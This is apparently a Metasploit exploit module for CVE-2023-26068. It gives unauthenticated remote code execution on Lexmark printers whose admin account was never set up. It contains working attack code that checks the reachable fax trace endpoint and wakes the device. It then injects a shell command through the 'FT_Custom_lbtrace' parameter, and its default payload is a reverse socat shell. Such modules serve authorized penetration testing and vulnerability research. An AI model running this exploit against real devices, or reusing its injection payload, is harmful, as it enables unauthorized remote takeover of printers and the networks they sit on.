##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Retry
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Lexmark Device Embedded Web Server RCE',
        'Description' => %q{
          A unauthenticated Remote Code Execution vulnerability exists in the embedded webserver in certain Lexmark devices through 2023-02-19.
          The vulnerability is only exposed if, when setting up the printer or device, the user selects "Set up Later" when asked
          if they would like to add an Admin user. If no Admin user is created the endpoint `/cgi-bin/fax_change_faxtrace_settings`
          is accessible without authentication. The endpoint allows the user to configure a number of different fax settings.

          A number of the configurable parameters on the page (ex. `FT_Custom_lbtrace`) fail to be sanitized properly before being
          used in an bash eval statement: `eval "$cmd" > /dev/null`, allowing for an unauthenticated user to run arbitrary commands.
        },
        'Author' => [
          'James Horseman', # Analysis & PoC
          'Zach Hanley',    # Analysis & PoC
          'jheysel-r7'      # Msf module
        ],
        'References' => [
          [ 'URL', 'https://github.com/horizon3ai/CVE-2023-26067'],
          [ 'URL', 'https://publications.lexmark.com/publications/security-alerts/CVE-2023-26068.pdf'],
          [ 'URL', 'https://www.horizon3.ai/lexmark-command-injection-vulnerability-zdi-can-19470-pwn2own-toronto-2022/'],
          [ 'CVE', '2023-26068']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['unix'],
        'Privileged' => false,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => ['unix'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_socat_tcp'
              }
            }
          ]
        ],
        'Payload' => {
          'Compat' =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'socat'
            }
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-03-13',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )

    register_options(
      [
        OptInt.new('SLEEP', [true, 'Sleep time to wait for the printer to wake', 10]),
      ]
    )
  end

  def check
    send_wakeup
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/cgi-bin/fax_change_faxtrace_settings'),
      'method' => 'GET'
    )

    return Exploit::CheckCode::Unknown('The target did not respond ') unless res
    return Exploit::CheckCode::Safe('The target does not seem to be vulnerable') unless res.code == 200 && res.get_xml_document.xpath('//title').text == 'Fax Trace Settings'

    Exploit::CheckCode::Appears('The vulnerable endpoint "/cgi-bin/fax_change_faxtrace_settings" is reachable')
  end

  # If the printer has been inactive for some time it might be sleeping, in which case it's best to send a request
  # or two to wake it up before running the check method or exploit.
  def send_wakeup
    retry_until_truthy(timeout: datastore['SLEEP']) do
      print_status('Waking up the printer...')
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, '/cgi-bin/fax_change_faxtrace_settings'),
        'method' => 'HEAD'
      )
      break if res && res.code == 200
    end
  end

  def exploit
    if datastore['ForceExploit'] || !datastore['AutoCheck']
      send_wakeup
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/cgi-bin/fax_change_faxtrace_settings'),
      'method' => 'POST',
      'data' => "FT_Custom_lbtrace=3;$(#{payload.encoded});#"
    )
    print_error('A response to the exploit attempt was received. This indicates the exploit was likely unsuccessful') if res
  end
end
